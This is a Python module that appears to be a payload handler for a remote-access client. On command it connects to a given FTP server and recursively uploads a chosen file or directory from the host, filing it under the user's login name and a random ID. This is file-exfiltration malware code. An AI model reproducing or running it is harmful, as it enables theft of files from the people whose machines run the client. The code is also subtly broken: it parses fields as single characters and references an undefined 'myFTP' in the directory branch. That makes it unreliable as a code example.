import ftplib
import os
import uuid
from subprocess import call
from payloads.absract_payload_handler import AbstractPayloadHandler
from client import settings

class FTPDownloadPayloadHandler(AbstractPayloadHandler):

    def ftp_upload(self,path):
        if os.path.isfile(path):
            try:
                os.chdir(os.path.dirname(path))
                with open(path,"rb") as infile:
                    self.myFTP.storbinary('STOR {}'.format(os.path.basename(path)), infile)
            except Exception as e:
                print(e)
        elif os.path.isdir(path):
            try:
                os.chdir(path)
                for f in os.listdir(path):        
                    if os.path.isfile(path + r'\{}'.format(f)):
                        with open(f,"rb") as infile:
                            self.myFTP.storbinary('STOR {}'.format(f), infile)
                    elif os.path.isdir(path + r'\{}'.format(f)):
                        myFTP.mkd(f)
                        myFTP.cwd(f)            
                        self.ftp_upload(path + r'\{}'.format(f))
                myFTP.cwd('..')
                os.chdir('..')
            except Exception as e:
                print(e)

    def execute_payload(self, data:bytes) -> str:
        '''
        server_addr,username,password,file=data[1],data[2],data[3],data[4]
        '''
        try:
            data=data.decode("utf-8")
            server_addr,uname,password,file=data[1],data[2],data[3],data[4]
            if not os.path.exists(file):
                return "Error absoulute path: {} does not exist\n".format(file)
            self.myFTP = ftplib.FTP(server_addr, uname, password)
            x="{}_{}".format(os.getlogin(),str(uuid.uuid4()))
            self.myFTP.mkdir(x)
            self.myFTP.cwd(x)
            self.ftp_upload(file)
            return "Successfully uploaded: {} to ftp server\n".format(file)
        except Exception as e:
            return "Command execution unsuccessful: {}\n".format(str(e))


